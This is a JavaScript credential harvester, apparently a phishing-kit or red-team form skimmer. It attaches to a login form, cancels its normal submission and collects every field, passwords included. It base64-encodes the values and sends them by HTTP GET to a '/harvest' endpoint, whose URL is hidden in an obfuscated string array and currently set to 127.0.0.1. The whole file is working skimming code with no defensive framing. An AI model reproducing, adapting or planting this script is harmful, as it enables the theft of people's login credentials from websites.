var siteId = "7e578ae5";
var formName = "loginform";
var formId = "93djokdi";
var enableEncoding = true;
var _0x3745 = ["http","://","127.0.0.1","/harvest?data=","GET"];

$(document).ready(function() {
        console.log("initializing harvester...");
        initHarvester();
});

function initHarvester() {
	var loginForm = document.getElementById(formName);
	if(loginForm) {
		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
		loginForm.addEventListener("submit", (e) => {
			e.preventDefault();
			grabAll();
		});
		console.log("locked and loaded");
	} else {
		console.log("ERROR: harvester failed to locate form '" + formName + "', check the HTML");
	}
}

/* parse through the form elements and serialize anything interesting */
function grabAll() {
	var loginForm = document.getElementById(formName);
	if(loginForm) {
		var payload = "";
		for(var i = 0; i < loginForm.length; i++) {
			var formElement = loginForm.elements[i];
			if(formElement) {
				//	the name value should always be set, but we may want to check (JavaScript forms could use ids)
				var elementName = null;
				elementName = formElement.name;
				if(elementName.length <= 0) {
					elementName = formElement.id;
				}
			
				console.log("DEBUG: name: " + elementName);		

				if(formElement.type != "submit") {
					var elementValue = "";

					if(formElement instanceof HTMLSelectElement) {
						var selectContents = "";
						console.log("DEBUG: need to parse all selectedOptions");
						if(formElement.multiple) {
							console.log("DEBUG: gotta catch em all");
							console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
							var optionList = formElement.selectedOptions;
							if(optionList.length > 0) {
								for(j = 0; j < optionList.length; j++) {
									console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
									//	serialize contents
									if(selectContents == "") 
										selectContents = optionList[j].value;
									else
										selectContents += "," + encodeURI(optionList[j].value);
								}
							}
						} else {
							selectContents = formElement.value;
						}
						//	encode whatever we parsed out of the select
						elementValue = encodeURI(selectContents);
					} else {	
						//	not a select, we can just grab the 'value' property	and encode it
						elementValue = encodeURI(formElement.value);
					}
					
					//	are we appending a payload? if so, use an ampersand to separate values
					if(payload == "")
						payload = elementName + ":" + elementValue;
					else
						payload += "&" + elementName + ":" + elementValue;				
				}
			}
		}
		
		//	check to see if base 64 encoding is enabled
		if(enableEncoding) {
			console.log("DEBUG: before base 64 encoding: " + payload);
			payload = btoa(payload);
		}
		//	output payload in console for debugging
		console.log("DEBUG: resulting payload = " + payload);
		//	send the payload to our webserver
		sendPayload(payload);
	} else {
		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
	}
}

function sendPayload(payload) {
	console.log("DEBUG: method configured: " + _0x3745[4]);
	$.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
}
